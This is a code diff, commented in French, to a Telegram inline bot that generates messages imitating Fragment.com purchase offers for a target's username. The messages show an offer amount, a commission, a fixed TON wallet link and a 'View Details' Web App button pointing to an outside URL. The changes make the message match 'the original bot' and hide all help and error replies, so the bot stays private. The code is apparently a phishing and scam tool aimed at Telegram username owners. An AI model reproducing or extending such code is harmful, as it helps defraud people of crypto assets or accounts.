@@ -70,7 +70,7 @@ def generate_fragment_message(username, ton_amount):
         # Adresse wallet
         wallet_address = "UQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XDPR"
         
-        # Message Fragment - Version simplifiée pour éviter les erreurs
+        # Message Fragment - IDENTIQUE au bot original
         fragment_message = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:
 
 • Offer Amount: 💎{price:g} (${price_usd:.2f} USD)
@@ -89,12 +89,70 @@ Important:
 
         print(f"🔧 DEBUG: Message généré, longueur: {len(fragment_message)}")
         
-        # Pas d'entités pour le moment - simplifié
+        # Création des entités pour le formatage
         entities = []
         
-        # Pas de clavier pour le moment - simplifié  
-        keyboard = None
+        # 1. Offer Amount en gras
+        offer_text = f"• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)"
+        offer_start = fragment_message.find(offer_text)
+        if offer_start != -1:
+            entities.append(MessageEntity(
+                type=MessageEntity.BOLD,
+                offset=offer_start,
+                length=len(offer_text)
+            ))
         
+        # 2. Commission en gras
+        commission_text = f"• Commission: 💎{commission:g} (${commission_usd:.2f} USD)"
+        commission_start = fragment_message.find(commission_text)
+        if commission_start != -1:
+            entities.append(MessageEntity(
+                type=MessageEntity.BOLD,
+                offset=commission_start,
+                length=len(commission_text)
+            ))
+        
+        # 3. Premier point Important en gras
+        important_text1 = "• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible."
+        important_start1 = fragment_message.find(important_text1)
+        if important_start1 != -1:
+            entities.append(MessageEntity(
+                type=MessageEntity.BOLD,
+                offset=important_start1,
+                length=len(important_text1)
+            ))
+        
+        # 4. Deuxième point Important en gras
+        important_text2 = "• If you choose not to proceed, simply ignore this message."
+        important_start2 = fragment_message.find(important_text2)
+        if important_start2 != -1:
+            entities.append(MessageEntity(
+                type=MessageEntity.BOLD,
+                offset=important_start2,
+                length=len(important_text2)
+            ))
+        
+        # 5. Wallet cliquable - LONGUEUR CORRECTE (48 caractères: UQ...PR)
+        wallet_start = fragment_message.find(wallet_address)
+        if wallet_start != -1:
+            entities.append(MessageEntity(
+                type=MessageEntity.TEXT_LINK,
+                offset=wallet_start,
+                length=48,  # Longueur exacte de UQ...PR (48 caractères)
+                url=f"https://tonviewer.com/{wallet_address}"
+            ))
+            print(f"🔗 Wallet link: position {wallet_start}, longueur 48 caractères")
+        
+        # 📱 BOUTON WEB APP INTÉGRÉ - Reste dans Telegram
+        webapp_url = f"{WEBAPP_URL}?user={username}&price={price:g}"
+        keyboard = InlineKeyboardMarkup([[
+            InlineKeyboardButton(
+                "View Details", 
+                web_app=WebAppInfo(url=webapp_url)
+            )
+        ]])
+        
+        print(f"🔗 Web App URL générée (intégrée): {webapp_url}")
         print(f"✅ DEBUG: Message Fragment généré avec succès pour {username}")
         return fragment_message, entities, keyboard
         
@@ -114,42 +172,20 @@ async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYP
         query = update.inline_query.query.strip() if update.inline_query.query else ""
         print(f"🔍 DEBUG: Requête reçue: '{query}'")
         
-        # Si pas de requête - afficher un message d'aide
+        # Si pas de requête ou format incorrect - ne rien afficher (bot privé)
         if not query:
-            print(f"🔍 DEBUG: Pas de query, envoi aide")
-            results = [
-                InlineQueryResultArticle(
-                    id="help",
-                    title="📝 Format: username montant",
-                    description="Exemple: testuser 100",
-                    input_message_content=InputTextMessageContent(
-                        "ℹ️ Utilisez le format: @votre_bot username montant\nExemple: @votre_bot testuser 100"
-                    )
-                )
-            ]
-            await update.inline_query.answer(results, cache_time=0)
-            print("📤 DEBUG: Aide envoyée avec succès")
+            print(f"🔍 DEBUG: Pas de query, envoi liste vide")
+            await update.inline_query.answer([], cache_time=0)
             return
         
         # Parsing de la requête (username montant)
         parts = query.split()
         print(f"📝 DEBUG: Parties parsées: {parts}")
         
-        # Si format incorrect - afficher un message d'aide
+        # Si format incorrect - ne rien afficher (bot privé)
         if len(parts) < 2:
-            print(f"🔍 DEBUG: Format incorrect, envoi erreur")
-            results = [
-                InlineQueryResultArticle(
-                    id="error_format",
-                    title="❌ Format incorrect",
-                    description="Utilisez: username montant",
-                    input_message_content=InputTextMessageContent(
-                        f"❌ Format incorrect pour: '{query}'\n\n📝 Format attendu: username montant\nExemple: testuser 100"
-                    )
-                )
-            ]
-            await update.inline_query.answer(results, cache_time=0)
-            print("📤 DEBUG: Erreur format envoyée avec succès")
+            print(f"🔍 DEBUG: Format incorrect, envoi liste vide")
+            await update.inline_query.answer([], cache_time=0)
             return
         
         username = parts[0].replace('@', '')  # Supprime @ si présent
@@ -162,18 +198,8 @@ async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYP
             print(f"📝 DEBUG: Montant validé: {ton_amount}")
         except ValueError as ve:
             print(f"📝 DEBUG: Erreur validation montant: {ve}")
-            results = [
-                InlineQueryResultArticle(
-                    id="error_amount",
-                    title="❌ Montant invalide",
-                    description=f"'{parts[1]}' n'est pas un nombre valide",
-                    input_message_content=InputTextMessageContent(
-                        f"❌ Montant invalide: '{parts[1]}'\n\n💡 Le montant doit être un nombre positif\nExemple: 100 ou 50.5"
-                    )
-                )
-            ]
-            await update.inline_query.answer(results, cache_time=0)
-            print("📤 DEBUG: Erreur montant envoyée avec succès")
+            # Ne rien afficher (bot privé)
+            await update.inline_query.answer([], cache_time=0)
             return
         
         print(f"✅ DEBUG: Paramètres validés: '{username}' - {ton_amount} TON")
@@ -188,19 +214,8 @@ async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYP
             import traceback
             print(f"❌ DEBUG: Traceback génération: {traceback.format_exc()}")
             
-            # Fallback avec message ultra simple
-            results = [
-                InlineQueryResultArticle(
-                    id="error_generation",
-                    title="❌ Erreur de génération",
-                    description="Impossible de créer le message",
-                    input_message_content=InputTextMessageContent(
-                        f"❌ Erreur génération: {str(gen_error)}"
-                    )
-                )
-            ]
-            await update.inline_query.answer(results, cache_time=0)
-            print("📤 DEBUG: Erreur génération envoyée")
+            # Ne rien afficher en cas d'erreur (bot privé)
+            await update.inline_query.answer([], cache_time=0)
             return
         
         # Prix pour affichage
@@ -242,7 +257,7 @@ async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYP
             import traceback
             print(f"❌ DEBUG: Traceback résultat: {traceback.format_exc()}")
             
-            # Fallback ultra simple
+            # Fallback ultra simple mais toujours fonctionnel
             try:
                 fallback_results = [
                     InlineQueryResultArticle(
@@ -258,11 +273,15 @@ async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYP
                 print("📤 DEBUG: Fallback simple envoyé avec succès")
             except Exception as fallback_error:
                 print(f"❌ DEBUG: Même le fallback a échoué: {fallback_error}")
+                # En dernier recours, liste vide
+                await update.inline_query.answer([], cache_time=0)
         
     except Exception as e:
         print(f"❌ DEBUG: Erreur critique dans inline_query_handler: {e}")
         import traceback
         print(f"❌ DEBUG: Traceback critique: {traceback.format_exc()}")
+        # En cas d'erreur critique, liste vide
+        await update.inline_query.answer([], cache_time=0)
 
 class WebhookHandler(BaseHTTPRequestHandler):
     """Gestionnaire webhook HTTP simple"""
